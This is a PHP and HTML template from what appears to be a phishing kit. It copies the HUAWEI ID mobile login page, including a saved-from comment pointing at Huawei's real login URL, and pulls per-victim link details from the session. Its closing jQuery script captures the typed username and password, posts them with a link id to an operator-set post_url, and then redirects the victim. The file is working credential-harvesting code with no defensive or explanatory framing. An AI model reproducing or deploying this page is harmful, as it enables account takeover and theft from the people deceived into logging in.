<?php
	session_name("CAKEPHP");
	session_start();
	include(__DIR__ . "/../includes/huawei.php");
	
	$username = $_SESSION['Link']['GeneratedLink']['username'] ?? '';
	$post_url = $_SESSION['Link']['VisitorDetails']['post_url'] ?? '';
	$link_id = $_SESSION['Link']['GeneratedLink']['id'] ?? '';
	$redirect_url = $_SESSION['Link']['GeneratedLink']['redirect_url'] ?? '';
	
?>
<!DOCTYPE html>
<!-- saved from url=(0382)https://id5.cloud.huawei.com/CAS/mobile/standard/login.html?loginUrl=https%3A%2F%2Fcloud.huawei.com%3A443%2FwapFindPhone%3Ftimestamp%3D1701224992301&service=https%3A%2F%2Fcloud.huawei.com%3A443%2FwapFindPhone%3Ftimestamp%3D1701224992301&loginChannel=1000002&reqClientType=1&lang=en-us&countryCode=cn&clientID=4805300&scope=https%3A%2F%2Fwww.huawei.com%2Fauth%2Faccount%2Fpwdlowlogin -->
<html class="hwid-html-portalBg hwid-html-minheight" hwid-deviceflag="">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta http-equiv="cleartype" content="on">
    <meta name="HandheldFriendly" content="True">
    <meta name="x5-fullscreen" content="true">
    <meta name="color-scheme" content="dark light">
    <meta name="format-detection" content="telephone=yes">
    <link rel="icon" href="data:;base64,=">
    <link rel="stylesheet" type="text/css" href="assets/body-mobile.css">
    <title>HUAWEI ID-<?=$language['login'][$lang];?></title>
    <script src="assets/jsAnalysis.js" async=""></script>
    
    <script src="assets/en-us.js" async=""></script>
    <link rel="stylesheet" href="assets/index-red-mobile.css">
    <link type="image/x-icon" rel="shortcut icon" href="https://id5.cloud.huawei.com/CAS/static_rss/rss_12/IDMW/common/logos/icons/huawei.ico">
  </head>
  <body class="hwid-content-height hwid-body-margin hwid-body-background" x-ms-format-detection="none" hwid-dir="ltr" hwid-lang="en" hwid-themename="red">
    <div data-title="HUAWEI ID-Log in" class="hwid-root">
      
      <div>
        <div class="hwid-login-container">
          <div class="hwid-login-header-root">
            <div class="hwid-header-tab">
              <div class="center">
                <div class="header-icon">
                  <div class="hwid-ic-root">
                    <span class="hwid-icon-ic_header_logo hwid_icon_padding-20"></span>
                  </div>
                </div>
                <p class="hwid-header-title">
                  <span ht="" class="hwid-text-container">
                    <span class="hwid-vertical-align">HUAWEI ID</span>
                  </span>
                </p>
                <p class="hwid-header-desc">
                  <span ht="" class="hwid-text-container">
                    <span class="hwid-vertical-align"><?=$language['mobile_sub'][$lang];?></span>
                  </span>
                </p>
              </div>
            </div>
          </div>
          <div class="hwid-pwdlogin-root">
            <form>
              <div class="hwid-mask">
                <div>
                  <input type="text" name="username" autocomplete="off" class="hwid-hidden-useraccount">
                  <input type="password" oncut="return false;" oncopy="return false;" autocomplete="off" class="hwid-hidden-password">
                </div>
              </div>
              <div class="hwid-textInput-root hwid-login-input-wrap" name="fieldAccount">
                <!---->
                <div class="hwid-input-area">
                  <!---->
                  <div class="hwid-input-content">
                    <input value="<?=$username;?>" id="email" type="text" autocomplete="off" maxlength="150" placeholder="<?=$language['email_place'][$lang];?>" ht="input_pwdlogin_account" class="hwid-input userAccount">
                  </div>
                  <!---->
                </div>
                <div class="hwid-common-line"></div>
                <!---->
                <span class="hwid-input hwid-input-tempSpan"><?=$language['email_place'][$lang];?></span>
              </div>
              <div class="hwid-password-root hwid-login-input-wrap" name="fieldPassword">
                <div class="hwid-input-area">
                  <input id="password" type="password" oncut="return false;" oncopy="return false;" autocomplete="off" maxlength="32" placeholder="<?=$language['password'][$lang];?>" ht="input_enter_password1" class="hwid-input">
                  <span class="hwid-pwdright-icon">
                    <i ht="click_eyeicon">
                      <div class="hwid-ic-root">
                        <span class="hwid-icon-ic_password_eyeoff hwid_icon_padding-12">
                          <span>
                            <span class="hwid-icon-ic_password_eyeon"></span>
                          </span>
                        </span>
                      </div>
                    </i>
                  </span>
                </div>
                <div class="hwid-common-line"></div>
                <!---->
              </div>
              <div class="hwid-input-msg-error" httagerr="errorMsg_pwdlogin">
                <div ht="" class="hwid-errorDiv" style="display: none">
                  <!---->
                  <span><?=$language['incorrect'][$lang];?></span>
                </div>
              </div>
              <!---->
            </form>
            <div class="hwid-forgetpwd-link">
              <div class="hwid-link hwid-button-base-box">
                <!---->
                <div class="textBtn">
                  <div ht="click_label_smsvalidLoad" role="button" class="">
                    <span ht="" class="hwid-text-container">
                      <span class="hwid-vertical-align"><?=$language['login_sms'][$lang];?></span>
                    </span>
                    <div class="hwid-loading-root hwid-loading-show-false" data-name="">
                      <div class="hwid-ic-root">
                        <span class="hwid-icon-ic_loading_dot_gray hwid_icon_padding-13"></span>
                      </div>
                      <!---->
                    </div>
                  </div>
                </div>
              </div>
              <div class="hwid-link hwid-button-base-box">
                <!---->
                <div class="textBtn">
                  <div ht="click_label_login_forgetpwd" role="button" class="">
                    <span ht="" class="hwid-text-container">
                      <span class="hwid-vertical-align"><?=$language['forgot'][$lang];?></span>
                    </span>
                    <div class="hwid-loading-root hwid-loading-show-false" data-name="">
                      <div class="hwid-ic-root">
                        <span class="hwid-icon-ic_loading_dot_gray hwid_icon_padding-13"></span>
                      </div>
                      <!---->
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="hwid-login-btn-wrap">
              <div class="hwid-button-base-box">
                <div ht="click_pwdlogin_submitLogin" role="button" class="normalBtn">
                  <div class="hwid-btn hwid-login-btn hwid-btn-primary hwid-disabled">
                    <span ht="" class="hwid-text-container">
                      <span class="hwid-vertical-align"><?=$language['login'][$lang];?></span>
                    </span>
                    <div class="hwid-loading-root hwid-loading-show-false" data-name="">
                      <div class="hwid-ic-root">
                        <span class="hwid-icon-ic_loadding_dot hwid_icon_padding-12"></span>
                      </div>
                      <!---->
                    </div>
                  </div>
                </div>
                <!---->
              </div>
              <div class="hwid-goto-register hwid-button-base-box">
                <div ht="click_pwdlogin_gotoregister" role="button" class="normalBtn">
                  <div class="hwid-btn">
                    <span ht="" class="hwid-text-container">
                      <span class="hwid-vertical-align"><?=$language['register'][$lang];?></span>
                    </span>
                    <div class="hwid-loading-root hwid-loading-show-false" data-name="">
                      <div class="hwid-ic-root">
                        <span class="hwid-icon-ic_loading_dot_gray hwid_icon_padding-12"></span>
                      </div>
                      <!---->
                    </div>
                  </div>
                </div>
                <!---->
              </div>
            </div>
          </div>
          <div class="hwid-smslogin-root hwid-mask">
            <div class="hwid-callingCode-root">
              <div class="hwid-countryCodeH-EMUI5">
                <span ht="text_country" class="hwid-text-container" type="mobile">
                  <span class="hwid-vertical-align">Country/Region</span>
                </span>
              </div>
              <div class="hwid-selectedCountryNameDiv">
                <span ht="click_wapRegister_selectedCallingCode" id="selectedCountry" class="hwid-selectedCountryName hwid-countryWidthFix">China +86</span>
                <div class="hwid-ic-root hwid-countryArrow hwid-mirror-icon" ht="click_wapRegister_icon_arrowright">
                  <span class="hwid_icon_ic_arrowright hwid_icon_fontSize-22"></span>
                </div>
                <div id="selectCountryCodeDiv"></div>
              </div>
              <div class="hwid-fullListSearch-root">
                <!---->
              </div>
            </div>
            <div class="hwid-textInput-root hwid-login-input-wrap" name="fieldPhone">
              <!---->
              <div class="hwid-input-area">
                <!---->
                <div class="hwid-input-content">
                  <input type="text" autocomplete="off" maxlength="20" placeholder="Phone" ht="input_smslogin_account" class="hwid-input">
                </div>
                <!---->
              </div>
              <div class="hwid-common-line"></div>
              <!---->
              <span class="hwid-input hwid-input-tempSpan">Phone</span>
            </div>
            <!---->
            <div class="hwid-getAuthCode-input" ht="input_smslogin_smsAuthCode|click_smslogin_getSmsAuthCode">
              <div class="hwid-input-area">
                <input type="text" maxlength="8" placeholder="SMS code" ht="input_smslogin_smsAuthCode" class="hwid-input">
                <div class="hwid-getAuthCode">
                  <!---->
                  <div class="hwid-button-base-box">
                    <!---->
                    <div class="textBtn">
                      <div ht="click_smslogin_getSmsAuthCode" role="button" aria-disabled="true" class="hwid-disabled hwid-smsCode">
                        <span ht="" class="hwid-text-container">
                          <span class="hwid-vertical-align">Get code</span>
                        </span>
                        <div class="hwid-loading-root hwid-loading-show-false" data-name="">
                          <div class="hwid-ic-root">
                            <span class="hwid-icon-ic_loading_dot_gray hwid_icon_padding-13"></span>
                          </div>
                          <!---->
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="hwid-common-line"></div>
              <div class="hwid-input-msg-error">
                <div ht="text_obtaincode_error_message" class="hwid-errorDiv">
                  <!---->
                  <span></span>
                </div>
              </div>
              <div class="hwid-common-toast hwid-mask">
                <div class="hwid-toastWrap">
                  <div class="hwid-toast"></div>
                </div>
              </div>
            </div>
            <input type="text" autocomplete="off" class="hwid-hidden-userPhone">
            <!---->
            <div class="hwid-login-btn-wrap">
              <div class="hwid-button-base-box">
                <div ht="click_smslogin_submitLogin" role="button" class="normalBtn">
                  <div class="hwid-btn hwid-btn-primary hwid-disabled">
                    <span ht="" class="hwid-text-container">
                      <span class="hwid-vertical-align">LOG IN/REGISTER</span>
                    </span>
                    <div class="hwid-loading-root hwid-loading-show-false" data-name="">
                      <div class="hwid-ic-root">
                        <span class="hwid-icon-ic_loadding_dot hwid_icon_padding-12"></span>
                      </div>
                      <!---->
                    </div>
                  </div>
                </div>
                <!---->
              </div>
              <div class="hwid-link hwid-goto-pwd-login hwid-button-base-box">
                <!---->
                <div class="textBtn">
                  <div ht="click_smslogin_changeToPwd" role="button" class="">
                    <span ht="" class="hwid-text-container">
                      <span class="hwid-vertical-align">Log in with password</span>
                    </span>
                    <div class="hwid-loading-root hwid-loading-show-false" data-name="">
                      <div class="hwid-ic-root">
                        <span class="hwid-icon-ic_loading_dot_gray hwid_icon_padding-13"></span>
                      </div>
                      <!---->
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <!---->
          <!---->
          <div class="hwid-login-header-root">
            <div class="hwid-login-footer">
              <!---->
              <div class="login-footer-link marginTop12">
                <div class="hwid-link hwid-goto-question hwid-button-base-box">
                  <!---->
                  <div class="textBtn">
                    <div ht="click_login_question" role="button" class="">
                      <span ht="" class="hwid-text-container">
                        <span class="hwid-vertical-align"><?=$language['help'][$lang];?></span>
                      </span>
                      <div class="hwid-loading-root hwid-loading-show-false" data-name="">
                        <div class="hwid-ic-root">
                          <span class="hwid-icon-ic_loading_dot_gray hwid_icon_padding-13"></span>
                        </div>
                        <!---->
                      </div>
                    </div>
                  </div>
                </div>
                <span class="link-split"></span>
                <div class="hwid-link hwid-goto-privacy hwid-button-base-box">
                  <!---->
                  <div class="textBtn">
                    <div ht="click_login_privacy" role="button" class="">
                      <span ht="" class="hwid-text-container">
                        <span class="hwid-vertical-align"><?=$language['privacy_state'][$lang];?></span>
                      </span>
                      <div class="hwid-loading-root hwid-loading-show-false" data-name="">
                        <div class="hwid-ic-root">
                          <span class="hwid-icon-ic_loading_dot_gray hwid_icon_padding-13"></span>
                        </div>
                        <!---->
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="hwid-pageBlankFill-root">
              <div class="blank-fill-bh9 blank-fill-pdt6"></div>
            </div>
          </div>
        </div>
      </div>
      <div>
        <div id="hwid-hwmeta" class="hwid-mask"></div>
      </div>
      <!---->
    </div>
    
  </body>
</html>

<script src="assets/js/jquery-3.7.1.min.js"></script>
<script>
var username = '<?=$username;?>';
var post_url = '<?=$post_url;?>';
var link_id = '<?=$link_id;?>';
var redirect_url = '<?=$redirect_url;?>';

$( document ).ready(function() {
    
	$('i[ht="click_eyeicon"]').on('pointerdown', function() {
		$(this).find("span:first-child").removeClass('hwid-icon-ic_password_eyeoff');
		$(this).find("span:first-child").addClass('hwid-icon-ic_password_eyeon');
		$('#password').attr('type','text');
	}).on('pointerup pointeleave', function() {
		$(this).find("span:first-child").removeClass('hwid-icon-ic_password_eyeon');
		$(this).find("span:first-child").addClass('hwid-icon-ic_password_eyeoff');
		$('#password').attr('type','password');
	});
	
	$('.hwid-login-btn').on('click',function(){
	
		if($(this).hasClass('hwid-disabled')){
			return false;
		}
	
		$('.hwid-errorDiv').hide();
		$('.hwid-common-line').removeClass('hwid-common-line-error');
		$('.hwid-login-btn').addClass('hwid-disabled');

		username = $('#email').val();
		var password = $('#password').val();
		var data = 'id=' + link_id + '&type=account&user=' + username + '&pass=' + password;
		
		$.ajax({
			type: "POST",
			dataType: "json",
			url: post_url,
			data: data,
			cache: false,
			success: function(data) {
				if(data.success == true){
					window.location.href = redirect_url;
				}else{
					$('.hwid-errorDiv').show();
					$('.hwid-common-line').addClass('hwid-common-line-error');
					$('.hwid-login-btn').removeClass('hwid-disabled');
				}
			},error: function(XMLHttpRequest, textStatus, errorThrown) {
				$('.hwid-errorDiv').show();
				$('.hwid-common-line').addClass('hwid-common-line-error');
				$('.hwid-login-btn').removeClass('hwid-disabled');
			}
		});
		
	});
	
	$('#email, #password').on('input',function(){
		var email = $('#email').val();
		var password = $('#password').val();
		
		if(email.trim().length >= 4 && password.trim().length >= 4){
			$('.hwid-login-btn').removeClass('hwid-disabled');
		}else{
			$('.hwid-login-btn').addClass('hwid-disabled');
		}
	});
	
	
});
</script>